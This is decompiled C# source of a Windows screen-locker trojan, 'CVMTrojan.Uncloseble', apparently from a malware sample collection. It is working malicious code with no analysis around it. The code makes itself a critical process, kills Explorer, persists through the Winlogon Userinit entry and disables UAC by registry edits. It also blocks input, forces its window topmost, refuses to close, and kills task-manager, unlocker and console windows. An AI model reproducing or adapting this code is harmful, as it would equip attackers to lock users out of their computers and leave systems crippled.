// Decompiled with JetBrains decompiler
// Type: CVMTrojan.Uncloseble.Form1
// Assembly: CVMTrojan.Uncloseble, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DCB2C54A-CD9F-4160-AF1D-2C926403FA8D
// Assembly location: \\VBOXSVR\B4s3\ToxicDatabase-main\Trojan\CVMTrojan.Uncloseable\CVMTrojan.Unclosable-net4.0.exe

using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

#nullable disable
namespace CVMTrojan.Uncloseble;

public class Form1 : Form
{
  private static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
  private const uint SWP_NOSIZE = 1;
  private const uint SWP_NOMOVE = 2;
  private const uint TOPMOST_FLAGS = 3;
  private IContainer components;
  private System.Windows.Forms.Timer CriticalTimer;
  private System.Windows.Forms.Timer WinlogonTimer;
  private System.Windows.Forms.Timer DisableTimer;
  private Label label1;
  private Label label2;
  private Label label3;
  private Label label4;
  private Label label5;
  private System.Windows.Forms.Timer TopMostTimer;
  private Label label6;
  private Label label7;
  private System.Windows.Forms.Timer BAN;
  private System.Windows.Forms.Timer BLOCK;

  [DllImport("ntdll.dll", SetLastError = true)]
  private static extern int NtSetInformationProcess(
    IntPtr hProcess,
    int processInformationClass,
    ref int processInformation,
    int processInformationLength);

  [DllImport("ntdll.dll", SetLastError = true)]
  private static extern int NtQueryInformationProcess(
    IntPtr hProcess,
    uint pic,
    ref uint pi,
    int cb,
    out int pSize);

  [DllImport("user32.dll")]
  [return: MarshalAs(UnmanagedType.Bool)]
  public static extern bool SetWindowPos(
    IntPtr hWnd,
    IntPtr hWndInsertAfter,
    int X,
    int Y,
    int cx,
    int cy,
    uint uFlags);

  public Form1() => this.InitializeComponent();

  protected override void WndProc(ref Message message)
  {
    if (message.Msg == 274 && (message.WParam.ToInt32() & 65520) == 61456)
      return;
    base.WndProc(ref message);
  }

  private void Form1_Load(object sender, EventArgs e)
  {
    int processInformationClass = 29;
    int processInformation = 1;
    try
    {
      Form1.NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
      foreach (Process process in Process.GetProcessesByName("explorer"))
        process.Kill();
    }
    catch
    {
    }
    Program.WinlogonStartup("Userinit", Application.ExecutablePath);
    this.DisableTimer.Enabled = true;
    this.WinlogonTimer.Enabled = true;
    this.TopMostTimer.Enabled = true;
    this.CriticalTimer.Enabled = true;
    this.BAN.Enabled = true;
    this.BLOCK.Enabled = true;
  }

  private void DisableTimer_Tick(object sender, EventArgs e)
  {
    try
    {
      RegistryKey subKey = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
      subKey.SetValue("EnableLUA", (object) 0);
      subKey.SetValue("EnableInstallerDetection", (object) 0);
      subKey.SetValue("PromptOnSecureDesktop", (object) 0);
      subKey.SetValue("ConsentPromptBehaviorAdmin", (object) 0);
      subKey.SetValue("EnableSecureUIAPaths", (object) 0);
      subKey.SetValue("EnableVirtualization", (object) 0);
      subKey.SetValue("FilterAdministratorToken", (object) 0);
      subKey.SetValue("EnableUIADesktopToggle", (object) 0);
    }
    catch
    {
    }
  }

  private void CriticalTimer_Tick(object sender, EventArgs e)
  {
    int processInformationClass = 29;
    int processInformation = 1;
    try
    {
      Form1.NtSetInformationProcess(Process.GetCurrentProcess().Handle, processInformationClass, ref processInformation, 4);
    }
    catch
    {
    }
  }

  private void WinlogonTimer_Tick(object sender, EventArgs e)
  {
    Program.WinlogonStartup("Userinit", Application.ExecutablePath);
  }

  private void TopMostTimer_Tick(object sender, EventArgs e)
  {
    Form1.SetWindowPos(this.Handle, Form1.HWND_TOPMOST, 0, 0, 0, 0, 3U);
  }

  private void label1_Click(object sender, EventArgs e)
  {
  }

  private void Form1_FormClosing(object sender, FormClosingEventArgs e)
  {
    e.Cancel = true;
    int num = (int) MessageBox.Show("Try to delete your brain", "AnonCVMCoder", MessageBoxButtons.OK, MessageBoxIcon.Hand);
  }

  [DllImport("USER32.DLL", CharSet = CharSet.Unicode)]
  public static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

  [DllImport("user32.dll")]
  private static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

  [DllImport("user32.dll")]
  public static extern int SendMessage(IntPtr hWnd, int wMsg, IntPtr wParam, IntPtr lParam);

  [DllImport("USER32.DLL")]
  private static extern bool EnumWindows(Form1.EnumWindowsProc enumFunc, int lParam);

  [DllImport("USER32.DLL")]
  private static extern int GetWindowText(IntPtr hWnd, StringBuilder lpString, int nMaxCount);

  [DllImport("USER32.DLL")]
  private static extern int GetWindowTextLength(IntPtr hWnd);

  [DllImport("USER32.DLL")]
  private static extern bool IsWindowVisible(IntPtr hWnd);

  [DllImport("USER32.DLL")]
  private static extern IntPtr GetShellWindow();

  [DllImport("kernel32.dll")]
  private static extern int GetProcessId(IntPtr handle);

  [DllImport("user32.dll", SetLastError = true)]
  private static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);

  private void BAN_Tick(object sender, EventArgs e)
  {
    new Thread((ThreadStart) (() =>
    {
      foreach (KeyValuePair<IntPtr, string> openWindow in (IEnumerable<KeyValuePair<IntPtr, string>>) Form1.OpenWindowGetter.GetOpenWindows())
      {
        IntPtr key = openWindow.Key;
        string str1 = openWindow.Value;
        Process.GetProcesses();
        string[] strArray1 = new string[6]
        {
          "process",
          "unlocker",
          "диспетчер",
          "монитор",
          "редактор",
          "checker"
        };
        string[] strArray2 = new string[3]
        {
          "TMain",
          "TForm1",
          "ConsoleWindowClass"
        };
        foreach (string str2 in strArray1)
        {
          if (str1.ToLower().Contains(str2))
          {
            Form1.SendMessage(key, 16 /*0x10*/, IntPtr.Zero, IntPtr.Zero);
            Form1.SendMessage(key, 2, IntPtr.Zero, IntPtr.Zero);
          }
        }
        foreach (string lpClassName in strArray2)
        {
          IntPtr window = Form1.FindWindow(lpClassName, (string) null);
          if (window != IntPtr.Zero)
          {
            Form1.ShowWindow(window, 0);
            Form1.SendMessage(window, 16 /*0x10*/, IntPtr.Zero, IntPtr.Zero);
            Form1.SendMessage(window, 2, IntPtr.Zero, IntPtr.Zero);
            Form1.SendMessage(window, 274, IntPtr.Zero, IntPtr.Zero);
            uint processId;
            int windowThreadProcessId = (int) Form1.GetWindowThreadProcessId(window, out processId);
            try
            {
              Process processById = Process.GetProcessById((int) processId);
              string fileName = processById.MainModule.FileName;
              processById.Kill();
              processById.WaitForExit();
            }
            catch (Exception ex)
            {
            }
          }
        }
      }
    })).Start();
  }

  private void BLOCK_Tick(object sender, EventArgs e) => Program.BlockInput(true);

  protected override void Dispose(bool disposing)
  {
    if (disposing && this.components != null)
      this.components.Dispose();
    base.Dispose(disposing);
  }

  private void InitializeComponent()
  {
    this.components = (IContainer) new System.ComponentModel.Container();
    this.CriticalTimer = new System.Windows.Forms.Timer(this.components);
    this.WinlogonTimer = new System.Windows.Forms.Timer(this.components);
    this.DisableTimer = new System.Windows.Forms.Timer(this.components);
    this.label1 = new Label();
    this.label2 = new Label();
    this.label3 = new Label();
    this.label4 = new Label();
    this.label5 = new Label();
    this.TopMostTimer = new System.Windows.Forms.Timer(this.components);
    this.label6 = new Label();
    this.label7 = new Label();
    this.BAN = new System.Windows.Forms.Timer(this.components);
    this.BLOCK = new System.Windows.Forms.Timer(this.components);
    this.SuspendLayout();
    this.CriticalTimer.Interval = 10;
    this.CriticalTimer.Tick += new EventHandler(this.CriticalTimer_Tick);
    this.WinlogonTimer.Tick += new EventHandler(this.WinlogonTimer_Tick);
    this.DisableTimer.Interval = 5000;
    this.DisableTimer.Tick += new EventHandler(this.DisableTimer_Tick);
    this.label1.AutoSize = true;
    this.label1.Font = new Font("Microsoft Sans Serif", 128f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
    this.label1.ForeColor = System.Drawing.Color.White;
    this.label1.Location = new Point(111, 9);
    this.label1.Name = "label1";
    this.label1.Size = new Size(423, 193);
    this.label1.TabIndex = 0;
    this.label1.Text = "TRY";
    this.label1.Click += new EventHandler(this.label1_Click);
    this.label2.AutoSize = true;
    this.label2.Font = new Font("Microsoft Sans Serif", 64f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
    this.label2.ForeColor = System.Drawing.Color.White;
    this.label2.Location = new Point(237, 190);
    this.label2.Name = "label2";
    this.label2.Size = new Size(162, 97);
    this.label2.TabIndex = 1;
    this.label2.Text = "TO";
    this.label3.AutoSize = true;
    this.label3.Font = new Font("Microsoft Sans Serif", 36f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
    this.label3.ForeColor = System.Drawing.Color.White;
    this.label3.Location = new Point(226, 287);
    this.label3.Name = "label3";
    this.label3.Size = new Size(187, 55);
    this.label3.TabIndex = 2;
    this.label3.Text = "CLOSE";
    this.label4.AutoSize = true;
    this.label4.Font = new Font("Microsoft Sans Serif", 64f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
    this.label4.ForeColor = System.Drawing.Color.White;
    this.label4.Location = new Point(237, 342);
    this.label4.Name = "label4";
    this.label4.Size = new Size(171, 97);
    this.label4.TabIndex = 3;
    this.label4.Text = "ME";
    this.label5.AutoSize = true;
    this.label5.Font = new Font("Microsoft Sans Serif", 20f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
    this.label5.ForeColor = System.Drawing.Color.White;
    this.label5.Location = new Point(534, 408);
    this.label5.Name = "label5";
    this.label5.Size = new Size(39, 31 /*0x1F*/);
    this.label5.TabIndex = 4;
    this.label5.Text = "=)";
    this.TopMostTimer.Interval = 1;
    this.TopMostTimer.Tick += new EventHandler(this.TopMostTimer_Tick);
    this.label6.AutoSize = true;
    this.label6.ForeColor = System.Drawing.Color.White;
    this.label6.Location = new Point(12, 516);
    this.label6.Name = "label6";
    this.label6.Size = new Size(154, 13);
    this.label6.TabIndex = 5;
    this.label6.Text = "v1.0 c0d9d by AnonCVMCoder";
    this.label7.AutoSize = true;
    this.label7.Font = new Font("Microsoft Sans Serif", 36f, FontStyle.Regular, GraphicsUnit.Point, (byte) 204);
    this.label7.ForeColor = System.Drawing.Color.White;
    this.label7.Location = new Point(207, 439);
    this.label7.Name = "label7";
    this.label7.Size = new Size(273, 55);
    this.label7.TabIndex = 6;
    this.label7.Text = "Sussy buka";
    this.BAN.Interval = 1000;
    this.BAN.Tick += new EventHandler(this.BAN_Tick);
    this.BLOCK.Tick += new EventHandler(this.BLOCK_Tick);
    this.AutoScaleDimensions = new SizeF(6f, 13f);
    this.AutoScaleMode = AutoScaleMode.Font;
    this.BackColor = System.Drawing.Color.Black;
    this.ClientSize = new Size(664, 538);
    this.Controls.Add((Control) this.label7);
    this.Controls.Add((Control) this.label6);
    this.Controls.Add((Control) this.label5);
    this.Controls.Add((Control) this.label4);
    this.Controls.Add((Control) this.label3);
    this.Controls.Add((Control) this.label2);
    this.Controls.Add((Control) this.label1);
    this.FormBorderStyle = FormBorderStyle.FixedDialog;
    this.MaximizeBox = false;
    this.MinimizeBox = false;
    this.Name = nameof (Form1);
    this.ShowIcon = false;
    this.ShowInTaskbar = false;
    this.StartPosition = FormStartPosition.CenterScreen;
    this.Text = "TRY TO CLOSE ME";
    this.FormClosing += new FormClosingEventHandler(this.Form1_FormClosing);
    this.Load += new EventHandler(this.Form1_Load);
    this.ResumeLayout(false);
    this.PerformLayout();
  }

  private delegate bool EnumWindowsProc(IntPtr hWnd, int lParam);

  public static class Win
  {
    public const int SW_HIDE = 0;
    public const int SW_SHOWNORMAL = 1;
    public const int SW_NORMAL = 1;
    public const int SW_SHOWMINIMIZED = 2;
    public const int SW_SHOWMAXIMIZED = 3;
    public const int SW_MAXIMIZE = 3;
    public const int SW_SHOWNOACTIVATE = 4;
    public const int SW_SHOW = 5;
    public const int SW_MINIMIZE = 6;
    public const int SW_SHOWMINNOACTIVE = 7;
    public const int SW_SHOWNA = 8;
    public const int SW_RESTORE = 9;
    public const int SW_SHOWDEFAULT = 10;
    public const int SW_FORCEMINIMIZE = 11;
    public const int SW_MAX = 11;
  }

  public static class OpenWindowGetter
  {
    public static IDictionary<IntPtr, string> GetOpenWindows()
    {
      IntPtr shellWindow = Form1.GetShellWindow();
      Dictionary<IntPtr, string> windows = new Dictionary<IntPtr, string>();
      Form1.EnumWindows((Form1.EnumWindowsProc) ((hWnd, lParam) =>
      {
        if (hWnd == shellWindow)
          return true;
        int windowTextLength = Form1.GetWindowTextLength(hWnd);
        if (windowTextLength == 0)
          return true;
        StringBuilder lpString = new StringBuilder(windowTextLength);
        Form1.GetWindowText(hWnd, lpString, windowTextLength + 1);
        windows[hWnd] = lpString.ToString();
        return true;
      }), 0);
      return (IDictionary<IntPtr, string>) windows;
    }
  }
}
